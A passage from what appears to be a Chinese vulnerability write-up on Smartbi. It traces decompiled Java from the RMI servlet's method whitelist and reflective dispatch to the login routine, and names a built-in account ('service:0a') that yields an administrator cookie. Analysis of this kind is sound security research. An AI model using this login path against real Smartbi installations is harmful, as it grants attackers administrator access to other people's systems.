style="color: #56B6C2">&amp;&amp;</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">StringUtil</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">isInArray</span><span style="color: #ABB2BF">(methodName, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[]{</span><span style="color: #98C379">&quot;compositeLogin&quot;</span><span style="color: #ABB2BF">})</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">                </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #D19A66">false</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">            } </span><span style="color: #C678DD">else</span><span style="color: #E06C75"> </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">className</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">equals</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;BusinessViewService&quot;</span><span style="color: #ABB2BF">)</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">StringUtil</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">isInArray</span><span style="color: #ABB2BF">(methodName, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[]{</span><span style="color: #98C379">&quot;closeBusinessView&quot;</span><span style="color: #ABB2BF">})</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">                </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #D19A66">false</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">            } </span><span style="color: #C678DD">else</span><span style="color: #E06C75"> </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">className</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">equals</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;DataSourceService&quot;</span><span style="color: #ABB2BF">)</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">StringUtil</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">isInArray</span><span style="color: #ABB2BF">(methodName, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[]{</span><span style="color: #98C379">&quot;clearClientData&quot;</span><span style="color: #ABB2BF">})</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">                </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #D19A66">false</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">            } </span><span style="color: #C678DD">else</span><span style="color: #E06C75"> </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">className</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">equals</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;MDSService&quot;</span><span style="color: #ABB2BF">)</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">StringUtil</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">isInArray</span><span style="color: #ABB2BF">(methodName, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[]{</span><span style="color: #98C379">&quot;getDefaultEncryptType&quot;</span><span style="color: #ABB2BF">})</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">                </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #D19A66">false</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">            } </span><span style="color: #C678DD">else</span><span style="color: #E06C75"> </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">className</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">equals</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;MDSService&quot;</span><span style="color: #ABB2BF">)</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">StringUtil</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">isInArray</span><span style="color: #ABB2BF">(methodName, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[]{</span><span style="color: #98C379">&quot;getOAMSURL&quot;</span><span style="color: #ABB2BF">})</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">                </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #D19A66">false</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">            } </span><span style="color: #C678DD">else</span><span style="color: #E06C75"> </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">className</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">equals</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;DPPortalService&quot;</span><span style="color: #ABB2BF">)</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">StringUtil</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">isInArray</span><span style="color: #ABB2BF">(methodName, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[]{</span><span style="color: #98C379">&quot;removePageBO&quot;</span><span style="color: #ABB2BF">})</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">                </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #D19A66">false</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">            } </span><span style="color: #C678DD">else</span><span style="color: #E06C75"> </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">methodName</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">equals</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;login&quot;</span><span style="color: #ABB2BF">)</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">                </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #D19A66">false</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">            } </span><span style="color: #C678DD">else</span><span style="color: #E06C75"> </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">className</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">equals</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;CommonService&quot;</span><span style="color: #ABB2BF">)</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">StringUtil</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">isInArray</span><span style="color: #ABB2BF">(methodName, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[]{</span><span style="color: #98C379">&quot;log&quot;</span><span style="color: #ABB2BF">})</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">                </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #D19A66">false</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">            } </span><span style="color: #C678DD">else</span><span style="color: #E06C75"> {</span></span><span class="line"><span style="color: #E06C75">                </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">!</span><span style="color: #E5C07B">className</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">equals</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;FingerTipsDataModule&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">            }</span></span><span class="line"><span style="color: #E06C75">        } </span><span style="color: #C678DD">else</span><span style="color: #E06C75"> {</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #D19A66">false</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">        }</span></span><span class="line"><span style="color: #E06C75">    }</span></span></code></pre></div></div></figure></li><li><p>寻找调用三种参数的方式</p><p>RMIServlet 的 doPost ⽅法，接受传参，通过 processExecute ⽅法 进⾏反射调⽤⽅法</p><p>\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FrameworkRMI.jar!\smartbi\framework\rmi\RMIServlet.class</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173427621.png" alt="image-20250811211750079"></p></li><li><p>跟近processExecute ⽅法</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">processExecute</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">HttpServletRequest</span><span style="color: #E06C75"> request</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> className</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> methodName</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> params) {</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">ClientService</span><span style="color: #E06C75"> service </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">RMIModule</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getInstance</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getService</span><span style="color: #ABB2BF">(className);</span><span style="color: #7F848E; font-style: italic">//会根据 className 来寻找对应的 ClinetService </span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> resultStr </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">try</span><span style="color: #E06C75"> {</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">StringBuilder</span><span style="color: #E06C75"> buff </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> (</span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">StringBuilder</span><span style="color: #E06C75">())</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">append</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;{&#39;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (service </span><span style="color: #56B6C2">==</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">                </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (className </span><span style="color: #56B6C2">!=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">                    </span><span style="color: #E5C07B">Locale</span><span style="color: #E06C75"> locale </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">CommonConfiguration</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getInstance</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getLocale</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #E06C75">                    </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> notFoundClass </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">StringUtil</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">replaceLanguage</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;${Notfoundclass}&quot;</span><span style="color: #ABB2BF">, locale);</span></span><span class="line"><span style="color: #E06C75">                    </span><span style="color: #C678DD">throw</span><span style="color: #E06C75"> (</span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">SmartbiException</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">CommonErrorCode</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">UNKOWN_ERROR</span><span style="color: #E06C75">))</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setDetail</span><span style="color: #ABB2BF">(className </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot; &quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> notFoundClass);</span></span><span class="line"><span style="color: #E06C75">                }</span></span><span class="line"><span style="color: #E06C75">            } </span><span style="color: #C678DD">else</span><span style="color: #E06C75"> {</span></span><span class="line"><span style="color: #E06C75">                </span><span style="color: #C678DD">long</span><span style="color: #E06C75"> startTime </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> (</span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">Date</span><span style="color: #E06C75">())</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getTime</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #E06C75">                </span><span style="color: #E5C07B">Object</span><span style="color: #E06C75"> obj </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">service</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">execute</span><span style="color: #ABB2BF">(methodName, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">JSONArray</span><span style="color: #ABB2BF">(params));</span></span><span class="line"><span style="color: #E06C75">                </span><span style="color: #C678DD">long</span><span style="color: #E06C75"> duration </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> (</span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">Date</span><span style="color: #E06C75">())</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getTime</span><span style="color: #ABB2BF">()</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">-</span><span style="color: #E06C75"> startTime</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">                </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (obj </span><span style="color: #56B6C2">==</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">                    </span><span style="color: #E5C07B">buff</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">append</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">retCode</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">:0&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">                } </span><span style="color: #C678DD">else</span><span style="color: #E06C75"> </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #56B6C2">!</span><span style="color: #E06C75">(obj </span><span style="color: #C678DD">instanceof</span><span style="color: #E06C75"> Collection) </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">!</span><span style="color: #E5C07B">obj</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getClass</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">isArray</span><span style="color: #ABB2BF">()</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">                    </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #56B6C2">!</span><span style="color: #E06C75">(obj </span><span style="color: #C678DD">instanceof</span><span style="color: #E06C75"> Boolean) </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">!</span><span style="color: #E06C75">(obj </span><span style="color: #C678DD">instanceof</span><span style="color: #E06C75"> Number)) {</span></span><span class="line"><span style="color: #E06C75">                        </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (obj </span><span style="color: #C678DD">instanceof</span><span style="color: #E06C75"> String) {</span></span><span class="line"><span style="color: #E06C75">                            </span><span style="color: #E5C07B">buff</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">append</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">retCode</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">:0,&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">                            </span><span style="color: #E5C07B">buff</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">append</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">result</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">:&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">                            </span><span style="color: #E5C07B">JSONUtils</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">quote</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">obj</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">toString</span><span style="color: #ABB2BF">(), buff);</span></span><span class="line"><span style="color: #E06C75">                        } </span><span style="color: #C678DD">else</span><span style="color: #E06C75"> </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">obj</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getClass</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">isEnum</span><span style="color: #ABB2BF">()</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">                            </span><span style="color: #E5C07B">buff</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">append</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">retCode</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">:0,&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">                            </span><span style="color: #E5C07B">buff</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">append</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">result</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">:&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">                            </span><span style="color: #E5C07B">JSONUtils</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">quote</span><span style="color: #ABB2BF">(((Enum)obj).</span><span style="color: #61AFEF">name</span><span style="color: #ABB2BF">(), buff);</span></span><span class="line"><span style="color: #E06C75">                        } </span><span style="color: #C678DD">else</span><span style="color: #E06C75"> {</span></span><span class="line"><span style="color: #E06C75">                            </span><span style="color: #E5C07B">buff</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">append</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">retCode</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">:0,&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">                            </span><span style="color: #E5C07B">buff</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">append</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">result</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">:&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">                            </span><span style="color: #E5C07B">JSONObject</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">fromBeanToString</span><span style="color: #ABB2BF">(obj, buff);</span></span><span class="line"><span style="color: #E06C75">                        }</span></span><span class="line"><span style="color: #E06C75">                    } </span><span style="color: #C678DD">else</span><span style="color: #E06C75"> {</span></span><span class="line"><span style="color: #E06C75">                        </span><span style="color: #E5C07B">buff</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">append</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">retCode</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">:0,&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">                        </span><span style="color: #E5C07B">buff</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">append</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">result</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">:&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">                        </span><span style="color: #E5C07B">buff</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">append</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">obj</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">toString</span><span style="color: #ABB2BF">());</span></span><span class="line"><span style="color: #E06C75">                    }</span></span><span class="line"><span style="color: #E06C75">                } </span><span style="color: #C678DD">else</span><span style="color: #E06C75"> {</span></span><span class="line"><span style="color: #E06C75">                    </span><span style="color: #E5C07B">buff</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">append</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">retCode</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">:0,&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">                    </span><span style="color: #E5C07B">buff</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">append</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">result</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">:&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">                    </span><span style="color: #E5C07B">JSONArray</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">fromObjectToString</span><span style="color: #ABB2BF">(obj, buff);</span></span><span class="line"><span style="color: #E06C75">                }</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">                </span><span style="color: #E5C07B">buff</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">append</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;,</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">duration</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">:&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> duration);</span></span><span class="line"><span style="color: #E06C75">            }</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">buff</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">append</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;}&#39;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">            resultStr </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">buff</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">toString</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">RMIModule</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getInstance</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">doCommit</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #E06C75">        } </span><span style="color: #C678DD">catch</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">Exception</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">ce</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (className </span><span style="color: #56B6C2">!=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #E06C75"> methodName </span><span style="color: #56B6C2">!=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">                resultStr </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">exceptionToString</span><span style="color: #E06C75">(className</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> methodName</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> ce)</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">            }</span></span><span class="line"><span style="color: #E06C75">        }</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> resultStr</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    }</span></span></code></pre></div></div></figure></li><li><p>到UserManagerModule 的 loginFromDB 的⽅法</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173431155.png" alt="image-20250811212506631"></p></li><li><p>SecurityServiceImpl 的 loginFromDB ⽅法对传⼊的账号密码进⾏判断，如果登录成 功返回true，即可返回管理员Cookie</p><p>（其中service:0a是smartBi的内置账号）</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">boolean</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">loginFromDB</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> username</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> password) {</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #C678DD">boolean</span><span style="color: #E06C75"> loginSucceed </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">false</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">IConnectionInfo</span><span style="color: #E06C75"> info </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">userManagerModule</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDaoModule</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getRepository</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getConnectionInfo</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">Connection</span><span style="color: #E06C75"> conn </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">PreparedStatement</span><span style="color: #E06C75"> prep </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">ResultSet</span><span style="color: #E06C75"> rs </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">;</span></span><span 